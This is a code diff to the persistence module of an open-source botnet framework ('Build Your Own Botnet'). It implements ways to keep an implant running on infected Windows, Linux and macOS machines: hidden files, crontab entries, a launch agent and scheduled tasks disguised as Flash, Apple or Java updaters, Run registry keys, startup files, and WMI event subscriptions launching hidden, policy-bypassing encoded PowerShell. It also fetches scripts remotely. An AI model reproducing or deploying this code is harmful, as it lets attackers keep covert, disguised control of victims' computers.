@@ -7,19 +7,19 @@ Copyright (c) 2018 Daniel Vega-Myhre
 from __future__ import print_function
 
 # standard libarary
+
 import os
 import sys
 import random
 import subprocess
 
-# byob
+# modules
+
 import util
 
-methods = {method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','powershell_wmi']}
 
 
-@util.config(platforms=['win32','linux2','darwin'])
-def add_hidden_file():
+def _add_hidden_file(value=None):
     try:
         value = sys.argv[0]
         if value and os.path.isfile(value):
@@ -30,20 +30,20 @@ def add_hidden_file():
                 dirname, basename = os.path.split(value)
                 path = os.path.join(dirname, '.' + basename)
                 hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
-            return True if hide else False
+            return (True if hide else False, path)
         else:
-            return (False, "File '{}' not found".format(value))
+            util.debug("File '{}' not found".format(value))
     except Exception as e:
-        return (False, 'Adding hidden file error: {}'.format(str(e)))
+        util.debug(e)
+    return (False, None)
 
 
-@util.config(platforms=['linux2'])
-def add_crontab_job(minutes=10, name='flashplayer'):
+def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
     try:
         if sys.platform == 'linux2':
             value = sys.argv[0]
             if value and os.path.isfile(value):
-                if not methods['crontab_job']['established']:
+                if not methods['crontab_job'].established:
                     user = os.getenv('USERNAME', os.getenv('NAME'))
                     task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                     with open('/etc/crontab', 'r') as fp:
@@ -55,17 +55,22 @@ def add_crontab_job(minutes=10, name='flashplayer'):
                 else:
                     return (True, path)
     except Exception as e:
-        util.debug("{} error: {}".format(add_crontab_job.func_name, str(e)))
+        util.debug("{} error: {}".format(_add_crontab_job.func_name, str(e)))
     return (False, None)
 
 
-@util.config(platforms=['darwin'])
-def add_launch_agent(name='com.apple.update.manager'):
+def _add_launch_agent(value=None, name='com.apple.update.manager'):
     try:
         if sys.platform == 'darwin':
-            value = sys.argv[0]
+            if not value:
+                if len(sys.argv):
+                    value = sys.argv[0]
+                elif '__file__' in globals():
+                    value = globals().get('__file__')
+                else:
+                    raise ValueError('No target file selected')
             if value and os.path.isfile(value):
-                code    = _resource('resource bash')
+                code    = util.remote_import('launch_agent.sh')
                 label   = name
                 if not os.path.exists('/var/tmp'):
                     os.makedirs('/var/tmp')
@@ -79,15 +84,16 @@ def add_launch_agent(name='com.apple.update.manager'):
                 if os.path.isfile(launch_agent):
                     os.remove(fpath)
                     return (True, launch_agent)
+                else:
+                    util.debug('File {} not found'.format(launch_agent))
     except Exception as e2:
         util.debug('Error: {}'.format(str(e2)))
     return (False, None)
 
 
-@util.config(platforms=['win32'])
-def add_scheduled_task(name='Java-Update-Manager'):
+def _add_scheduled_task(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['scheduled_task'].get('established'):
+        if os.name == 'nt' and not methods['scheduled_task'].established:
             value = sys.argv[0]
             name  = util.variable(random.randint(6,11))
             if value and os.path.isfile(value):
@@ -99,10 +105,9 @@ def add_scheduled_task(name='Java-Update-Manager'):
     return (False, None)
 
 
-@util.config(platforms=['win32'])
-def add_startup_file(name='Java-Update-Manager'):
+def _add_startup_file(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
+        if os.name == 'nt' and not methods['startup_file'].established:
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 appdata = os.path.expandvars("%AppData%")
@@ -116,81 +121,76 @@ def add_startup_file(name='Java-Update-Manager'):
                         fp.write(content)
                 return (True, startup_file)
     except Exception as e:
-        util.debug('{} error: {}'.format(add_startup_file.func_name, str(e)))
+        util.debug('{} error: {}'.format(_add_startup_file.func_name, str(e)))
     return (False, None)
 
 
-@util.config(platforms=['win32'])
-def add_registry_key(name='Java-Update-Manager'):
+def _add_registry_key(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
+        if os.name == 'nt' and not methods['registry_key'].established:
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 try:
                     util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                     return (True, name)
                 except Exception as e:
-                    util.debug('{} error: {}'.format(add_registry_key.func_name, str(e)))
+                    util.debug('{} error: {}'.format(_add_registry_key.func_name, str(e)))
     except Exception as e:
-        util.debug('{} error: {}'.format(add_registry_key.func_name, str(e)))
+        util.debug('{} error: {}'.format(_add_registry_key.func_name, str(e)))
     return (False, None)
 
 
-@util.config(platforms=['win32'])
-def add_powershell_wmi(command=None, task_name='Java-Update-Manager'):
+def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['powershell_wmi'].get('established'):
+        if os.name == 'nt' and not methods['powershell_wmi'].established:
             cmd_line  = ""
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 cmd_line = 'start /b /min {}'.format(value)
             elif command:
-                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
+                cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
             if cmd_line:
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                powershell = _resource('resource powershell').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
+                powershell = util.remote_import('wmi.ps1').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
                 util.powershell(powershell)
-                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
+                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                 result = util.powershell(code)
-                if task_name in result:
+                if name in result:
                     return (True, result)
-            return (False, None)
     except Exception as e:
-        util.debug('{} error: {}'.format(add_powershell_wmi.func_name, str(e)))
+        util.debug('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
+    return (False, None)
 
 
-@util.config(platforms=['win32'])
-def remove_scheduled_task():
-    if methods['scheduled_task'].get('established') and os.name == 'nt':
-        value = methods['scheduled_task'].get('result')
+def _remove_scheduled_task():
+    if methods['scheduled_task'].established and os.name == 'nt':
+        value = methods['scheduled_task'].result
         try:
              if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                  return (False, None)
         except: pass
-    return (methods['scheduled_task']['established'], methods['scheduled_task']['result'])
+    return (methods['scheduled_task'].established, methods['scheduled_task'].result)
 
 
-@util.config(platforms=['win32','linux2','darwin'])
-def remove_hidden_file():
+def _remove_hidden_file():
     try:
-        if methods['hidden_file'].get('established'):
-            filename = methods['hidden_file']['result']
+        if methods['hidden_file'].established:
+            filename = methods['hidden_file'].result
             if os.path.isfile(filename):
                 try:
                     unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return (False, None)
                 except Exception as e1:
-                    util.debug('{} error: {}'.format(remove_hidden_file.func_name, str(e1)))
+                    util.debug('{} error: {}'.format(_remove_hidden_file.func_name, str(e1)))
     except Exception as e2:
-        util.debug('{} error: {}'.format(remove_hidden_file.func_name, str(e2)))
-    return (methods['hidden_file']['established'], methods['hidden_file']['result'])
+        util.debug('{} error: {}'.format(_remove_hidden_file.func_name, str(e2)))
+    return (methods['hidden_file'].established, methods['hidden_file'].result)
 
 
-@util.config(platforms=['linux2'])
-def remove_crontab_job(name='flashplayer'):
+def _remove_crontab_job(value=None, name='flashplayer'):
     try:
-        if sys.platform == 'linux2' and methods['crontab_job'].get('established'):
+        if sys.platform == 'linux2' and methods['crontab_job'].established:
             with open('/etc/crontab','r') as fp:
                 lines = [i.rstrip() for i in fp.readlines()]
                 for line in lines:
@@ -200,72 +200,130 @@ def remove_crontab_job(name='flashplayer'):
                 fp.write('\n'.join(lines))
         return (False, None)
     except Exception as e:
-        util.debug('{} error: {}'.format(remove_crontab_job.func_name, str(e)))
-    return (methods['hidden_file']['established'], methods['hidden_file']['result'])
+        util.debug('{} error: {}'.format(_remove_crontab_job.func_name, str(e)))
+    return (methods['hidden_file'].established, methods['hidden_file'].result)
 
 
-@util.config(platforms=['darwin'])
-def remove_launch_agent(name='com.apple.update.manager'):
+def _remove_launch_agent(value=None, name='com.apple.update.manager'):
     try:
-        if methods['launch_agent'].get('established') and os.name == 'nt':
-            launch_agent = persistence['launch_agent'].get('result')
+        if methods['launch_agent'].established and os.name == 'nt':
+            launch_agent = persistence['launch_agent'].result
             if os.path.isfile(launch_agent):
                 util.delete(launch_agent)
                 return (False, None)
     except Exception as e:
-        util.debug("{} error: {}".format(remove_launch_agent.func_name, str(e)))
-    return (methods['launch_agent']['established'], methods['launch_agent']['result'])
+        util.debug("{} error: {}".format(_remove_launch_agent.func_name, str(e)))
+    return (methods['launch_agent'].established, methods['launch_agent'].result)
 
 
-@util.config(platforms=['win32'])
-def remove_powershell_wmi(task_name='Java-Update-Manager'):
+def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
     try:
-        if methods['powershell_wmi'].get('established'):
+        if methods['powershell_wmi'].established:
             try:
                 code = """
                 Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'",  Remove-WmiObject
                 Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" ,  Remove-WmiObject
-                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription ,  Where-Object { $_.filter -match '[NAME]'} ,  Remove-WmiObject""".replace('[NAME]', task_name)
+                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription ,  Where-Object { $_.filter -match '[NAME]'} ,  Remove-WmiObject""".replace('[NAME]', name)
                 result = util.powershell(code)
                 if not result:
                     return (False, None)
             except: pass
-        return (methods['powershell_wmi']['established'], methods['powershell_wmi']['result'])
+        return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
     except Exception as e:
-        util.debug('{} error: {}'.format(add_powershell_wmi.func_name, str(e)))
-    return (methods['powershell_wmi']['established'], methods['powershell_wmi']['result'])
+        util.debug('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
+    return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
     
 
-@util.config(platforms=['win32'])
-def remove_registry_key(name='Java-Update-Manager'):
+def _remove_registry_key(value=None, name='Java-Update-Manager'):
     try:
-        if methods['registry_key'].get('established') and os.name == 'nt':
-            import _winreg
-            value = methods['registry_key'].get('result')
+        if methods['registry_key'].established and os.name == 'nt':
+            value = methods['registry_key'].result
             try:
-                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_ALL_ACCESS)
+                key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
                 _winreg.DeleteValue(key, name)
                 _winreg.CloseKey(key)
                 return (False, None)
             except: pass
-        return (methods['registry_key']['established'], methods['registry_key']['result'])
+        return (methods['registry_key'].established, methods['registry_key'].result)
     except Exception as e:
         util.debug(str(e))
 
 
-@util.config(platforms=['win32'])
-def remove_startup_file():
+def _remove_startup_file():
     try:
-        if methods['startup_file'].get('established') and os.name == 'nt':
-            value = methods['startup_file'].get('result')
+        if methods['startup_file'].established and os.name == 'nt':
+            value = methods['startup_file'].result
             if value and os.path.isfile(value):
                 if os.name != 'nt':
                     return (False, None)
                 appdata      = os.path.expandvars("%AppData%")
-                startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+                startup_dir  = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                 startup_file = os.path.join(startup_dir, value) + '.eu.url'
                 if os.path.exists(startup_file):
                     util.delete(startup_file)
         return (False, None)
     except Exception as e:
-        util.debug('{} error: {}'.format(remove_startup_file.func_name, str(e)))
+        util.debug('{} error: {}'.format(_remove_startup_file.func_name, str(e)))
+
+
+
+class Method():
+    """
+    Persistence Method (Build Your Own Botnet)
+    """
+    def __init__(self, name, platforms=['win32','linux2','darwin']):
+        if '_add_{}'.format(name) in globals() and '_remove_{}'.format(name) in globals():
+            self.name           = name
+            self.result         = None
+            self.established    = False
+            self.platforms      = platforms
+        else:
+            raise ValueError("persistence method '{}' not found".format(name))
+    
+    def add(self):
+        if sys.platform in self.platforms:
+            if not self.established:
+                self.established, self.result = eval('_add_{}'.format(self.name))()
+        else:
+            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+
+    def remove(self):
+        if sys.platform in self.platforms:
+            if self.established:
+                self.established, self.result = eval('_remove_{}'.format(self.name))()
+        else:
+            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
+
+
+hidden_file    = Method('hidden_file')
+scheduled_task = Method('scheduled_task', platforms=['win32'])
+registry_key   = Method('registry_key',   platforms=['win32'])
+startup_file   = Method('startup_file',   platforms=['win32'])
+launch_agent   = Method('launch_agent',   platforms=['darwin'])
+crontab_job    = Method('crontab_job',    platforms=['linux2'])
+powershell_wmi = Method('powershell_wmi', platforms=['win32'])
+
+
+def methods():
+    return {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}
+
+def results():
+    return {name: method.result for name, method in methods().items() if method.established}
+
+def run():
+    for name, method in methods().items():
+        if sys.platform in method.platforms:
+            try:
+                method.add()
+            except Exception as e:
+                util.debug(e)
+    return results()
+    
+def abort():
+    for name, method in methods().items():
+        if sys.platform in method.platforms:
+            try:
+                method.remove()
+            except Exception as e:
+                util.debug(e)
+
